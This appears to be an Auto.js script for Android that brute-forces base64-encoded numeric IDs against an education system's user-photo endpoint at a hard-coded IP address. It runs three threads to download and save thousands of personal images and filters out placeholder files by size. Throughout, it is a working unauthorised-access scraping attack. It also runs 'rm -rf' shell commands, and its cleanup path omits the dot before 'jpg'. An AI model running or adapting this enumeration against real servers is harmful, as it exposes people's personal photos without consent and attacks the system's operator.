var dir = "tmp/"
var s1 = 1929640000;
var s2 = 2029640000;
var s3 = 2129640000;

var e1 = s1 + 2500;
var e2 = s2 + 2500;
var e3 = s3 + 2500;
var PicLength = 9834;
let $$init = {
    start() {
        return turno();

        function turno() {

            shell("rm -rf /sdcard/" + dir, true);
            shell("mkdir /sdcard/" + dir, true);

            threads.start(function () {
                let url1;
                let img1;
                for (let i1 = s1; i1 < e1; i1++) {
                    url1 = "http://120.42.37.20/general/EDU/appserver/UserImg/pic_jmgyxx.php?ID=" + $base64.encode(String(i1));
                    console.info("url1: " + url1);
                    img1 = images.load(url1);
                    //log(Object.keys(img).length);

                    console.info("save: " + images.save(img1, "/sdcard/" + dir + String(i1) + ".jpg", "jpg"));

                    console.log("wc -c /sdcard/" + dir + String(i1) + ".jpg");
                    if (shell("wc -c /sdcard/" + dir + String(i1) + ".jpg").result.split(" ")[0] == PicLength) {
                        console.info("find");
                        shell("rm -rf /sdcard/" + dir + String(i1) + "jpg");
                    }

                    img1.recycle();
                    // sleep(50);
                }
            });

            threads.start(function () {
                let url2;
                let img2;
                for (let i2 = s2; i2 < e2; i2++) {
                    url2 = "http://120.42.37.20/general/EDU/appserver/UserImg/pic_jmgyxx.php?ID=" + $base64.encode(String(i2));
                    console.info("url2: " + url2);
                    img2 = images.load(url2);

                    console.info("save: " + images.save(img2, "/sdcard/" + dir + String(i2) + ".jpg", "jpg"));

                    console.log("wc -c /sdcard/" + dir + String(i2) + ".jpg");
                    if (shell("wc -c /sdcard/" + dir + String(i2) + ".jpg").result.split(" ")[0] == PicLength) {
                        console.info("find");
                        shell("rm -rf /sdcard/" + dir + String(i2) + "jpg");
                    }

                    img2.recycle();
                    // sleep(50);
                }
            });
            threads.start(function () {
                let url3;
                let img3;
                for (let i3 = s3; i3 < e3; i3++) {
                    url3 = "http://120.42.37.20/general/EDU/appserver/UserImg/pic_jmgyxx.php?ID=" + $base64.encode(String(i3));
                    log("url3: " + url3);
                    img3 = images.load(url3);

                    console.info("save: " + images.save(img3, "/sdcard/" + dir + String(i3) + ".jpg", "jpg"));

                    console.log("wc -c /sdcard/" + dir + String(i3) + ".jpg");
                    if (shell("wc -c /sdcard/" + dir + String(i3) + ".jpg").result.split(" ")[0] == PicLength) {
                        console.info("find");
                        shell("rm -rf /sdcard/" + dir + String(i3) + "jpg");
                    }

                    img3.recycle();
                    // sleep(50);
                }
            });
        }
    },
    bind() {
        return this;
    },
}.bind();

sleep(2000);
try {
    $$init.start();
} catch (Error) {
    console.warn(Error);
    $$init.start();
}
while (1);